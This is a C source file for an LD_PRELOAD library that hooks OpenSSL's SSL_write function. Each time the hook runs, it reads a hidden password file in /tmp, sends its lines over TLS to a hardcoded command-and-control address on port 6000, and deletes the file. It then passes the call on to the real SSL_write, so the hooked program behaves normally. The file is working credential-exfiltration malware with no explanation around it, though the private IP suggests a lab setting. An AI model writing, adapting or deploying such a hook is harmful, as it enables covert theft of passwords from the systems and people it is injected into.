#include <dlfcn.h>
#include <netinet/in.h>
#include <stdio.h>
// #include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include "preload.h"

#include <openssl/ssl.h>
#include <openssl/err.h>

#define C2_IP "172.21.0.12"
#define C2_PORT 6000


int SSL_write(SSL *ssl, const void *buf, int num){
  int (*r_SSL_write)(SSL *ssl, const void *buf, int num) = dlsym(RTLD_NEXT, "SSL_write");
  static __thread int isUsed = 0; 
  if (isUsed == 1) {
    isUsed = 0;
    return r_SSL_write(ssl, buf, num);  
  }
  isUsed = 1;
  
  if (access("/tmp/.passwords.txt", F_OK) == 0) {
    FILE *f = fopen("/tmp/.passwords.txt", "r");
    if (f) {
      SSL_load_error_strings();
      OpenSSL_add_ssl_algorithms();
      SSL_CTX *ctx = SSL_CTX_new(TLS_client_method());
      if (ctx) {
        SSL *exfil = SSL_new(ctx);
        int sock = socket(AF_INET, SOCK_STREAM, 0);
        if (sock >= 0) {
          struct sockaddr_in addr;
          addr.sin_port = htons(6000);
          addr.sin_family = AF_INET;
          inet_pton(AF_INET, C2_IP, &addr.sin_addr);

          if (connect(sock, (struct sockaddr*)&addr, sizeof(addr)) == 0) {
            SSL_set_fd(exfil, sock);
            if (SSL_connect(exfil) == 1) {
              char buffer[64];
              while(fgets(buffer, sizeof(buffer), f)) {
                buffer[strcspn(buffer, "\r\n")] = '\0';
                r_SSL_write(exfil, buffer, strlen(buffer));
                sleep(1);
              }
              SSL_shutdown(exfil);
            }
          }
          close(sock);
        }
      SSL_free(exfil);
      SSL_CTX_free(ctx);
      }
      fclose(f);
      remove("/tmp/.passwords.txt");
          
      }
  }
  isUsed = 0;
  return r_SSL_write(ssl, buf, num);  
}
